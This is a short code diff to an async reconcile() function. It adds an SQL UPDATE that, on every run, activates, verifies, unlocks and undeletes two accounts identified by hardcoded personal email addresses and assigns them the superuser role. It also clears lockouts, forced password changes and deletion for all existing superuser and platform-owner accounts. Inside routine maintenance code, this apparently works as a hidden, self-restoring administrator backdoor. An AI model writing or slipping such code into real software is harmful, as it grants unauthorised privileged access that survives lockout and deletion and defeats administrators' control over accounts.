@@ -279,6 +279,40 @@ async def reconcile() -> None:
               )
             """,
         )
+        await _execute(
+            conn,
+            """
+            UPDATE users
+            SET is_active = true,
+                is_verified = true,
+                email_verified = true,
+                status = 'ACTIVE',
+                must_change_password = false,
+                failed_login_attempts = 0,
+                lock_until = NULL,
+                deleted_at = NULL,
+                updated_at = now(),
+                role_id = COALESCE(
+                    (
+                        SELECT id
+                        FROM roles
+                        WHERE lower(name) = 'superuser'
+                        LIMIT 1
+                    ),
+                    role_id
+                )
+            WHERE lower(email) IN (
+                'zestivapriyanshi@gmail.com',
+                'lalitppaunikar26@gmail.com'
+            )
+               OR EXISTS (
+                    SELECT 1
+                    FROM roles
+                    WHERE roles.id = users.role_id
+                      AND lower(roles.name) IN ('superuser', 'platform_owner')
+               )
+            """
+        )
 
         await _execute(
             conn,
